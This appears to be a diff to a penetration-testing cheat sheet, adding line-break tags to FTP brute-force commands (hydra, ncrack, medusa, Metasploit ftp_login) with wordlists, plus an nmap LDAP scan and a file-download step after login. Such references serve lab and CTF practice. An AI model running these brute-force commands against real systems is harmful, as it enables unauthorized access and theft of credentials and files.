@@ -80,15 +80,15 @@ nmap -p389 –sV -iL <host>  or nmap -p389 –sV <host> (Find the FQDN in a subn
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
 
 **Brute force FTP**                         
-hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt <host> ftp 
-hydra -l administrator -P /usr/share/wordlist/passwords.txt <host> ftp 
-ncrack -U usernames.txt -P passwords.txt ftp://<host>
-ncrack -U usernames.txt -P passwords.txt <host>:21 -v 
-medusa -h <host> -U usernames.txt -P passwords.txt -M ftp 
-msf> auxiliary(scanner/ftp/ftp_login)>
-set RHOSTS <target IP>
-set user_file /path/usernames.txt
-set pass_file /path/passwords.txt
+hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt <host> ftp <br>
+hydra -l administrator -P /usr/share/wordlist/passwords.txt <host> ftp <br>
+ncrack -U usernames.txt -P passwords.txt ftp://<host><br>
+ncrack -U usernames.txt -P passwords.txt <host>:21 -v <br>
+medusa -h <host> -U usernames.txt -P passwords.txt -M ftp <br>
+msf> auxiliary(scanner/ftp/ftp_login)><br>
+set RHOSTS <target IP><br>
+set user_file /path/usernames.txt<br>
+set pass_file /path/passwords.txt<br>
 
 **Download file from FTP after login** 
 ls then get secret.txt
